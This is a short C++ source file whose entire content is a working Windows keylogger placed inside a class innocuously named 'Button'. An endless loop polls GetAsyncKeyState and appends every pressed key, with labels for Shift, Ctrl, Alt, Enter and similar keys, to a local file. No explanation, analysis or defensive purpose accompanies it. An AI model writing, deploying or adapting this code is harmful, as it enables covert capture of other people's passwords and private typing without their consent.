#include "library.h"
class Button {
public:
	int but() {
		ofstream keylogger("file.txt", ios::app);
		while (1) {
			for (char q = 8; q <= 222; q++) {
				if (GetAsyncKeyState(q) == -32767) {
					keylogger << q;
				}
				else if (GetAsyncKeyState(VK_SHIFT) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|ShIft|";
					}
				}
				else if (GetAsyncKeyState(VK_CAPITAL) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|CaPs lock|";
					}
				}
				else if (GetAsyncKeyState(VK_TAB) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|TaB|";
					}
				}
				else if (GetAsyncKeyState(VK_CONTROL) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|CtRl|";
					}
				}
				else if (GetAsyncKeyState(VK_BACK) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|BaCkspace|";
					}
				}
				else if (GetAsyncKeyState(VK_MENU) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|AlT|";
					}
				}
				else if (GetAsyncKeyState(VK_RETURN) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|EnTer|";
					}   
				}
				else if (GetAsyncKeyState(VK_SPACE) == -32767) {
					if (keylogger.is_open()) {
						keylogger << "|SpAce|";
					}
				}
			}
		}
		return 0;
	}
};